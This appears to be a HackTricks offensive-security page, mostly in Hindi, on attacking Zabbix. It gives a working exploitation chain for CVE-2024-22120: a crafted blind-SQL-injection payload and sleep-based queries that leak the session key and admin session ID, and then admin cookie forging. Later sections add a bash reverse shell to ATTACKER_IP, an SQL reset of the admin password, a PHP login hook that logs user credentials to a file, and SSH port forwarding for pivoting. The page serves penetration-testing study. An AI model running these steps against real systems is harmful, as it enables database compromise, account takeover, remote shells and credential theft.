# Zabbix सुरक्षा

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

Zabbix एक monitoring प्लेटफ़ॉर्म है जो एक web UI एक्सपोज़ करता है (आमतौर पर Apache/Nginx के पीछे) और एक server component है जो Zabbix protocol पर TCP/10051 (server/trapper) और agent पर TCP/10050 पर भी बात करता है। Engagements के दौरान आप निम्न का सामना कर सकते हैं:

- Web UI: HTTP(S) वर्चुअल होस्ट जैसे zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

उपयोगी cookie फॉर्मैट: zbx_session एक compact JSON ऑब्जेक्ट का Base64 है जिसमें कम-से-कम sessionid, serverCheckResult, serverCheckTime और sign शामिल होते हैं। sign JSON payload का HMAC होता है।

## zbx_session cookie के अंदरूनी विवरण

हाल के Zabbix वर्ज़न cookie को इस तरह गणना करते हैं:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

यदि आप global session_key और एक वैध admin sessionid recover कर सकें, तो आप offline एक वैध Admin cookie forge करके UI में authenticate कर सकते हैं।

## CVE-2024-22120 — Time-based blind SQLi in Zabbix Server audit log

प्रभावित वर्ज़न (जैसा कि सार्वजनिक रूप से दस्तावेज़ित):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

कमज़ोरी सारांश:

- जब किसी Script execution को Zabbix Server audit log में रिकॉर्ड किया जाता है, तो clientip फ़ील्ड sanitize नहीं होता और SQL में concatenated किया जाता है, जिससे server component के माध्यम से time-based blind SQLi सक्षम होता है।
- यह तब exploit किया जा सकता है जब आप Zabbix server पोर्ट 10051 पर एक crafted "command" request भेजते हैं जिसमें एक वैध low-privileged sessionid, एक hostid जिसे user एक्सेस कर सकता है, और एक permitted scriptid शामिल हों।

पूर्व शर्तें और खोज सुझाव:

- sessionid: web UI के guest/login से, zbx_session (Base64) को decode करके sessionid प्राप्त करें।
- hostid: web UI requests (जैसे Monitoring → Hosts) के माध्यम से देखें या proxy से intercept करें; सामान्य default 10084 है।
- scriptid: केवल वही scripts execute होंगे जो current role को permitted हैं; script menu/AJAX responses देखकर verify करें। सामान्य defaults जैसे 1 या 2 अक्सर allowed होते हैं; 3 deny हो सकता है।

### Exploitation flow

1) clientip में SQLi के साथ audit insert ट्रिगर करें

- TCP/10051 से कनेक्ट करें और एक Zabbix framed message भेजें जिसमें request="command" हो और sid, hostid, scriptid शामिल हों, तथा clientip को ऐसे SQL expression पर सेट करें जो server द्वारा concatenated होकर evaluate होगा।

न्यूनतम message (JSON body) फ़ील्ड्स:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
पूर्ण वायर फ़ॉर्मेट है: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. आप pwntools या अपने socket code का उपयोग इसे फ्रेम करने के लिए कर सकते हैं।

2) Time-bruteforce secrets को conditional sleep के जरिए

response time मापकर conditional expressions का उपयोग करके hex-encoded secrets को एक-एक char करके leak करें। व्यवहार में काम करने वाले उदाहरण:

- Leak global session_key from config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) sessions से:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Notes:

- charset: 32 hex अक्षर [0-9a-f]
- Pick T_TRUE >> T_FALSE (e.g., 10 vs 1) और प्रति प्रयास wall-clock मापें
- Ensure your scriptid is actually authorized for the user; अन्यथा कोई audit row उत्पन्न नहीं होगा और timing काम नहीं करेगा

3) Admin cookie फ़ोर्ज करें

Once you have:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

Compute:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Set the cookie zbx_session to this value and GET /zabbix.php?action=dashboard.view to validate Admin access.

### Ready-made tooling

- Public PoC स्वचालित करता है: session_key और admin sessionid का bruteforce, और cookie forging; इसके लिए pwntools और requests चाहिए।
- आम तौर पर दिए जाने वाले पैरामीटर: --ip (UI का FQDN), --port 10051, --sid (low-priv), --hostid, और वैकल्पिक रूप से ज्ञात --admin-sid ताकि brute से बचा जा सके।

## Script execution के माध्यम से RCE (post-Admin)

UI में Admin access होने पर, आप monitored hosts के खिलाफ predefined Scripts चला सकते हैं। यदि agents/hosts script commands स्थानीय रूप से execute करते हैं, तो यह उन सिस्टम्स पर code execution देता है (अक्सर Linux hosts पर zabbix user के रूप में):

- Quick check: run id चलाकर user context की पुष्टि करें
- Reverse shell उदाहरण:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
TTY अपग्रेड (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
यदि आपके पास DB access है, तो forging a cookie के बजाय Admin पासवर्ड को "zabbix" के लिए दस्तावेजीकृत bcrypt पर रीसेट करना एक तरीका है:
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

यदि file write संभव है और web UI server तक पहुँच हो, तो आप अस्थायी रूप से /usr/share/zabbix/index.php में form-based login branch के आसपास एक logging snippet जोड़कर credentials capture कर सकते हैं:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
यूज़र्स सामान्य रूप से प्रमाणीकृत होते हैं; बाद में /dev/shm/creds.txt पढ़ें। काम खत्म होने पर hook हटाएँ।

## Pivoting to internal services

यदि service account shell /usr/sbin/nologin भी हो, तो एक SSH authorized_keys एंट्री जोड़कर और -N -L का उपयोग करके loopback-only सेवाओं के लिए local port-forwarding की अनुमति मिलती है (e.g., CI/CD at 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
अधिक tunneling पैटर्न के लिए देखें: [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## ऑपरेशनल टिप्स

- सुनिश्चित करें कि scriptid वर्तमान role के लिए अनुमत है (guest के पास सीमित सेट हो सकता है)
- Timing brute धीमा हो सकता है; पुनः प्राप्त admin sessionid को cache करें और पुन: उपयोग करें
- 10051 को भेजा गया JSON ZBXD\x01 हेडर और little-endian length के साथ फ्रेम किया जाना चाहिए

## संदर्भ

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
